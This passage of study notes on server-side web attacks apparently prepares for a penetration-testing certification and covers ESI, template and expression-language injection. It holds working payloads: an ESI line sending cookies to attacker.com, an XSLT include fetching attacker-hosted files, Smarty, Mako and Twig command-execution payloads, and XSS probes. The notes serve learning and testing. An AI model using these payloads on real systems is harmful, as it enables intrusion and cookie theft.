+</code></pre><p id="cffed757-cb6c-4054-8ba8-d5faf4789117" class="">The xss.html can contain similar code:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f213e81e-a5f9-4dc5-a149-28ede670f347" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><p id="4da93aa8-b4bf-4797-89a5-2d531a8b2fc4" class="">Exfiltrate cookies directly by referring to a special variable:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6d82d881-3de4-4a3d-ad43-d39ee8a1d8ba" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;esi:include src=http://attacker.com/$(HTTP_COOKIE)&gt;
+# which can bypass the httpOnly flag in case of its presence
+</code></pre><p id="4df9cd56-f924-4027-b854-50c797a7a1fb" class="">There is a possibility For RCE when the app has support For XSLT</p><ul id="74642990-ae54-494c-bc14-4ec26ee31a05" class="bulleted-list"><li style="list-style-type:disc">XLST is a dynamic language used to transform XML files according to a specific pattern</li></ul><p id="3d630cfd-186d-44cd-89b8-51add250af21" class="">The Payload For the ESI Injection to the XSLT execution:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ef9ad637-61a7-4faa-8990-ad673a506361" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;esi:include src=&quot;http://attacker.com/file.xml&quot; dca=&quot;xslt&quot; stylesheet=&quot;http://attacker.com/transformation.xsl&quot; /&gt;
+</code></pre><p id="7b6fe892-2e5a-4a2b-b6f6-67f6e6a925da" class="">Moreover:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ee5575fe-7dca-4f4a-af05-b72e1c896dd3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection
+- https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations
+</code></pre><h2 id="ac3073f9-3e14-4edc-a3f5-e14ef3351e4f" class=""><strong>Language Evaluation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#language-evaluation"></a></strong></h2><p id="8a6f70ad-b8db-46b1-b95d-5668ac104363" class="">Includes:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="36932c3b-9857-4290-8406-9f49f743c03c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Double evaluation
+- Server-side Template Injections
+- Expression language injections
+</code></pre><blockquote id="bbcaa975-126d-4cbf-800b-b158b9ba7a3e" class="">All caused by users ability to force the target application server to execute arbritrary programmistic code. This code is always in form of an expression</blockquote><h3 id="e2361d4e-2881-4ff1-9508-202ccfd8d842" class=""><strong>Template Engines</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#template-engines"></a></strong></h3><p id="1b1de907-3d67-4f5a-aa6f-155067e50d28" class="">Similar to the SSI, some web apps use template systems to enable dynamic content generation into their pages:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bc07b9fb-24f3-42d1-bafe-224e5cb41369" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$template-&gt;render(&quot;Hello ${user_name}!&quot;)
+</code></pre><blockquote id="eb3bc123-9ee4-48b9-a24e-1e4570e83593" class="">The expression ${} = the Template Expression</blockquote><p id="28f48525-1f48-454b-a4ea-3e109f3011b3" class="">which holds the <em>user_name</em> variable. We dont know the origin of the user_name;</p><p id="01aeb76f-1555-4a6a-ad5e-b02457b31026" class="">Presumably its generated server-side (during login). Using the template engine, its possible to dynamically print that user name on the login page</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6af63361-a1e5-4e6c-97aa-00fe33e84685" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$template-&gt;render(&quot;Hello $_GET[&#x27;user_name&#x27;]!&quot;)
+# in this case, the user could be able to inject the template expression independently.
+# We now control what will be evaluated and most likely, user_name is the last thing of interest.
+</code></pre><p id="2fe17415-de5f-415f-8d9b-d91a29c8390c" class="">Most popular languages which use templates in web dev:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="81cb0626-d941-475c-99ad-3138e11d48c6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- PHP (Twig, Smarty)
+- Python (Flask, Jinja)
+- Java (Freemarker)
+</code></pre><p id="4cc59d12-5453-4fa9-9193-304c4432ccbb" class="">In Java apps, some technologies have a similar purpose of generating dynamic content:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="57c3bd3c-08e4-482e-91e7-14a04efeb80a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- OGNL (Object-Graph Navigation Language) - frequently used in Apache Struts RCE exploits
+- EL (Expression Language) - generic dynamic expression set For Java applications
+</code></pre><h3 id="6bd1d363-606e-49e0-9483-19972baa7b37" class=""><strong>Detecting Template Injection</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#detecting-template-injection"></a></strong></h3><p id="808b2e85-1028-47b7-93df-84378f8341e0" class="">Tricky to find and exploit</p><ul id="fc1cfc9b-5158-4abf-8072-2ed5090c54fc" class="bulleted-list"><li style="list-style-type:disc">we can inject multiple template tags into the web app and observe if they were transformed in some way in the response</li></ul><ul id="f191c626-7d28-4e5e-8b87-9bbc9f1395a5" class="bulleted-list"><li style="list-style-type:disc">Keep in mind, that often the injected data might be reflected indirectly, For instance, on a different page than it was injected (e.g. invalid login names might be reflected in admin-only accessible logs)</li></ul><p id="218069c6-895f-4c0b-894b-e34d37df0fa1" class="">Most template expression are similar to each other; they are all in curly braces like the below examples:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b4009211-6b4e-4f1f-b872-01b0b50cad74" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">{ {expr} }
+${expr}
+%{expr}
+#{expr}
+%25{expr}
+{expr}
+</code></pre><h3 id="6b1b92d1-c748-46fb-b0f5-46b23cac269a" class=""><strong>Confirming Template Injection</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#confirming-template-injection"></a></strong></h3><p id="418866cf-7760-48a6-b638-c58bc4de3910" class="">The best expression to inject:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ec3aa9db-1684-4274-a8fc-e8623390abed" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">${5*11111}
+# in this case, you would look For the value &#x27;55555&#x27; in the response of your request
+</code></pre><blockquote id="6a5fabaa-247e-40af-a8b5-d856444c47e3" class="">Further confirmation is required to be sure that the code is executed on the server-side and has access to sensitive data</blockquote><p id="65a6d67b-be78-4612-b44a-281c26a1f88d" class="">With Burp Suite PRO, u should get an extension named <strong>J2EE Scan</strong> which automatically adds tests FOr expression language injection</p><p id="b1e8ff30-7a92-4559-9494-46946214328d" class="">Another idea could be to use <strong>Burp Intruder</strong> to test several payloads of that type, as its likely that while,</p><p id="53d60088-e535-4d42-8998-63f599000ff9" class="">For example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c9d7b1b4-2fe0-4bfb-b48d-d6778a9bbdf4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#{5*11111} # will work
+%{5*11111} # may not
+</code></pre><p id="8dc00522-5f08-4c81-b79f-270a1b1084b7" class="">You can use the following diagram to help u profiling this type of vuln, whether its a template or expression language injection</p><figure id="de438ab9-7331-4d08-806a-4ee7c3990639" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/61.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/61.png"/></a></figure><h3 id="703e5f62-f277-4910-9a2d-94cb304ec570" class=""><strong>To better identify the technology</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#to-better-identify-the-technology"></a></strong></h3><p id="485e4238-cabe-4d54-b96f-9bd3fb5df5d4" class="">The first step after observing anomalies related to calculations or unusual handling of expressions in curly braces should be trying to identify the underlying technology</p><ul id="c4de6d28-8d92-4f0c-a591-cfd6d90839e6" class="bulleted-list"><li style="list-style-type:disc">Observe which is the generic technology of the app. If its Java (u see it used .jsp extensions), then u can suspect its an expression language / OGNL</li></ul><ul id="5293af26-b172-4210-9808-9e0a8f7734d7" class="bulleted-list"><li style="list-style-type:disc">Use the diagram from before as it contains popular behavior of template engines when handling expressions</li></ul><ul id="6a742ccd-57f3-49ff-9d4f-f34322a82818" class="bulleted-list"><li style="list-style-type:disc">Try to inject unclosed curly braces (be careful as there is a chance u might permanently disable the attacked webpage); This might provoke verbose error disclosing the underlying technology</li></ul><ul id="cdbdb546-5240-4518-a5c7-c521586f5841" class="bulleted-list"><li style="list-style-type:disc">Observe other verbose errors For technology names</li></ul><h3 id="71a83c7e-b8f9-4343-92e5-2fded91bc748" class=""><strong>Exploiting Template Injection</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#exploiting-template-injection"></a></strong></h3><p id="c779996e-6f3a-4e7d-bb5b-972c5e28e03a" class="">PHP Smarty:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="28f758a6-892a-499d-afee-eee6cc5a1e98" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># The RCE payload can be as simple as the one-liner:
+{php}echo &#x27;id&#x27;;{/php}
+</code></pre><p id="ee47d9a6-f656-42ee-b110-3b0bfeb0d5f6" class="">Python Mako:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3f35ac92-eec3-4ecc-8e65-3198e34115ed" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;%
+  import os
+  x=os.popen(&#x27;id&#x27;).read()
+%&gt;
+${x}
+</code></pre><p id="82530f47-0808-47bc-934c-1fc23446b4b3" class="">PHP Twig:</p><p id="2e92e5fc-32ae-4789-a77c-965a60c30b29" class="">https://github.com/s4n7h0/xvwa</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187b0b74-c58c-44ea-a8c8-b22b54fa4db6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">{ {5*5} }
+# results in &quot;25&quot;
+
+{ {&lt;svg/onload=confirm(1)&gt;} }
+# u can observe a XSS vuln
+</code></pre><p id="f5710721-2ea2-4938-9104-3cac71991d36" class="">Twig used a known object named <em>**</em> = current application instance</p><ul id="aedcb303-480d-43e5-921a-9b7a0a27f78c" class="bulleted-list"><li style="list-style-type:disc">one of the twigs _self attributes is named <strong>env</strong> and contains other methods that can be called</li></ul><p id="c61380b3-80f7-4c9e-97e2-6ed2a01e6431" class="">→ https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php</p><p id="292e5175-a0eb-4d75-abbb-9d5d88c39a0d" class="">Example <em>display function</em>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25b7551a-401e-4a4e-8340-8ae25688079f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">{ { _self.env.display(&quot;xyz&quot;) } }
+</code></pre><p id="4ab0ad09-4143-431d-bacc-764d3ff4ac97" class="">Executing commands via the getFilter function must be done as follows:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d11d5665-7f1a-4c8e-a94d-6ad4454ab453" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Call registerUndefinedFilterCallback, which allows us to register any function as a filter callback
+- The filter callback is then called by invoking _self.env.getFilter()
+</code></pre><p id="d220e6fc-c7f7-4a33-882d-1fbb173a78f5" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e2077f9e-eda9-4130-be8c-371b849e8e69" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">{ { _self.env.registerUndefinedFilterCallback(&quot;system&quot;) } } { {_self.env.getFilter(&quot;whoami&quot;) } }
+</code></pre><p id="7b0d2341-7ffe-4876-a5de-4e7870ad607d" class="">Moreover:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="03bc56c8-82d8-40f1-8455-68fb3faddfa2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
+</code></pre><h2 id="8d689818-0ee2-422b-9ef1-385ce5288ea2" class=""><strong>Expression Language / OGNL injection</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#expression-language--ognl-injection"></a></strong></h2><p id="cad26c61-2d8e-4185-bd83-db4ea2fd1c7f" class="">Java apps are easily recognizable because:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a23caaf-e929-42b0-88b3-80931c30c89d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Use common extensions like .jsp or .jsf
+- Throw stack traces on errors
+- Use known terms in headers like &quot;Servlet&quot;
+</code></pre><p id="7ec85ac9-3006-41d1-9e71-fe213ce35291" class="">Confirm the injection with a calculation output:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="00035c8d-0685-4ab4-8f3b-4bb3ea265253" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">${*5}
+{5*5}
+#{5*5}
+%{5*5}
+%25{5*5}
+</code></pre><figure id="f01ba6e8-3b6c-46ca-9850-037cc4957d80" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/62.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/62.png"/></a></figure><p id="c58610de-25f2-426f-80f9-595d3131be27" class="">The code is saved as Main.java</p><ul id="1b5933cb-2e59-4e47-afad-8514019f47dc" class="bulleted-list"><li style="list-style-type:disc">Several jars should be present to test properly</li></ul><p id="806cea66-b466-40dc-8abe-88013a9fc58a" class="">→ https://commons.apache.org/proper/commons-lang/download_lang.cgi</p><p id="aec184d4-22f6-4099-a6a1-47b487b40f37" class="">→ https://www.javadoc.io/doc/org.springframework/spring-core/latest/index.html</p><p id="26732444-c42e-4d09-b743-c57560fa18f1" class="">→ https://www.javadoc.io/doc/org.springframework/spring-expression/latest/index.html</p><blockquote id="717f7a00-e844-489a-b84a-16c57ec58bd0" class="">Make sure u have JDK working</blockquote><ul id="9d1c1588-127c-4348-b9d7-6371fa19fe09" class="bulleted-list"><li style="list-style-type:disc">try to run <strong>javac</strong> and <strong>java -version</strong></li></ul><p id="776056c4-a633-43fe-b24b-87ba6503584b" class="">Otherwise:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="37a4ee10-ac87-4edc-abe4-64d911003924" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">apt install update and install default-jdk
+</code></pre><p id="982b7ec0-d86f-4fef-baf5-c3568bbffba5" class="">Compile the jar libraries</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0961a74c-9bed-46d6-bdac-dc9ee75e4751" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">javac -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:.Main.java
